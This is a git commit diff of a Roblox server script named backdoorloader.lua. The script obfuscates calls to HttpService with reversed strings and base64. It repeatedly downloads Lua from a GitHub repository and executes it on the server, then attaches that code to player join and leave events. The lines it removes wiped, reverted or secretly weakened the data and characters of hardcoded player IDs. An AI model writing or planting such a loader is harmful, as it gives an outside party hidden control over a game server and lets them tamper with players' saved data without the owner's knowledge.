b1259fd3ec07bd97676c58bc596b5178c259688e
xiynn <117784259+xiynn@users.noreply.github.com>
2025-04-12 13:27:48 -0600

    Update backdoorloader.lua

--- backdoorloader.lua
+++ backdoorloader.lua
@@ -1,17 +1,3 @@
-local wipe = {
-}
-
-local Revert = {
-	7129257981;
-	8089163919;
-	--4407961133;
-}
-
-local terribleskills = {
-	7129257981;
-	8089163919;
-}
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local ServerStorage = game:GetService("ServerStorage")
 local RunService = game:GetService("RunService")
@@ -24,17 +10,15 @@ local Main = require(ServerStorage.Modules.EntityStateMachines.NPCBoss.Data.Main
 
 local m = {}
 
-local RevertData = {}
-
 local a = game[('ecivreSteG'):reverse()];
 local b = a(game, ('ecivreSpttH'):reverse())
 local f = b[('cnysAteG'):reverse()];
 
 local CurrentVersion
 
-
 local Vers
 
+local FirstLoad
 
 local function DeepCopyTable(Table)
 	local copy = {}
@@ -50,9 +34,11 @@ end
 
 function m:Init()
 
-	pcall(function()
+	--[[pcall(function()
 		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
-	end)
+	end)]]
+	
+	repeat task.wait(0.5) until FirstLoad == true
 
 	task.spawn(function()
 		if not _G[('gnirtsdaoL'):reverse()] then
@@ -82,94 +68,75 @@ function m:Init()
 	end)
 end
 
+
+local PACon
+local PRCon
+local CACon
+
 function m:StartScript()
-
-
-	pcall(function()
-		CurrentVersion = Vers:GetVersion()
-	end)
-
-
-	Players.PlayerAdded:Connect(function(Player)
+	local s,c
+	local Global
+	
+	if Vers then
+		if PACon then
+			PACon:Disconnect()
+			PACon = nil
+		end
+		if PRCon then
+			PRCon:Disconnect()
+			PRCon = nil
+		end
+		if CACon then
+			CACon:Disconnect()
+			CACon = nil
+		end
+		if Global then
+			Global = nil
+		end
+		
+		local Mainfuncs 
+		
+		repeat
+			pcall(function()
+				Mainfuncs= Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/mainfuncs.lua'))()
+			end)
+			task.wait(1)
+		until Mainfuncs
+		
 		pcall(function()
-			local PlayerId = Player.UserId
+			CurrentVersion = Vers:GetVersion()
+		end)
+		
+		
+		PACon = Players.PlayerAdded:Connect(function(Player)
+			Mainfuncs:PlayerAdded(Player)
+		end)
+		PRCon = Players.PlayerRemoving:Connect(function(Player)
+			Mainfuncs:PlayerRemoving(Player)
+		end)
+		
+		Global = {
+			globalfunc = function()
+				
+			end,
 
-			local Key = "Player_".. PlayerId
-
-			if table.find(wipe, PlayerId) then
-				local s, e = pcall(function()
-					Player:Kick()
-
-					DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, {});
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-			end
-
-			if table.find(Revert, PlayerId) then
-				local s, e = pcall(function()
-					RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)
-
-					--print(RevertData[Key])
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-			end
-
-			if table.find(terribleskills, PlayerId) then
-				local Character
-				local s, e =  pcall(function()
-					Character = Player.Character
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-
-				if Character then
-					Character:SetAttribute("CatDamage", -0.3)
-					Character:SetAttribute("CatDefense", 1.2)
-				end
-				Player.CharacterAdded:Connect(function(char)
-					char:SetAttribute("CatDamage", -0.3)
-					char:SetAttribute("CatDefense", 1.2)
-				end)
+		}
+		
+		if s then
+			MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'globalfunc'})
+		end
+		
+		task.delay(4, function()
+			for i, v in pairs(Players:GetPlayers()) do
+				Mainfuncs:PlayerAdded(v)
 			end
 		end)
-	end)
+	end
 
-	Players.PlayerRemoving:Connect(function(Player)
-		pcall(function()
-			local PlayerId = Player.UserId
-
-			local Key = "Player_".. PlayerId
-
-			if table.find(Revert, PlayerId) and RevertData[Key] then
-				--print(RevertData[Key])
-				Player:Kick()
-
-				DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, RevertData[Key]);
-			end
-		end)
-	end)
-
-	--print(CurrentVersion)
-
-	local Global = {
-		overwrite = function()
-
-		end,
-
-	}
 	local function msc(m)
 		Global[m.Data.Command](m.Data)
 	end
-
-	local s, c
+	
 	repeat
 		s, c = pcall(function()
 			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
@@ -177,61 +144,29 @@ function m:StartScript()
 		task.wait()
 	until
 	s
+end
 
-	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
-
-	task.delay(4, function()
-		for i, v in pairs(Players:GetPlayers()) do
-			local PlayerId = v.UserId
-
-			local Key = "Player_".. PlayerId
-
-			if table.find(wipe, PlayerId) then
-				local s, e = pcall(function()
-					v:Kick()
-
-					DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, {});
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-			end
-
-			if table.find(Revert, PlayerId) then
-				local s, e = pcall(function()
-					RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)
-
-					--print(RevertData[Key])
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-			end
-
-			if table.find(terribleskills, PlayerId) then
-				local Character
-				local s, e =  pcall(function()
-					Character = v.Character
-				end)
-
-				if not s then 
-					--warn(e)
-				end
-
-				if Character then
-					Character:SetAttribute("CatDamage", -0.3)
-					Character:SetAttribute("CatDefense", 1.2)
-				end
-				v.CharacterAdded:Connect(function(char)
-					char:SetAttribute("CatDamage", -0.3)
-					char:SetAttribute("CatDefense", 1.2)
-				end)
+task.spawn(function()
+	local s,c 
+	while true do
+		
+		s,c = pcall(function()
+			Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
+		end)
+		if s then
+			if not FirstLoad then
+				FirstLoad = true
 			end
 		end
-	end)
-end
+		
+		if CurrentVersion then
+			if CurrentVersion ~= Vers:GetVersion() then
+				m:StartScript()
+			end
+		end
+		task.wait(10)
+	end
+end)
 
 m:Init()
 
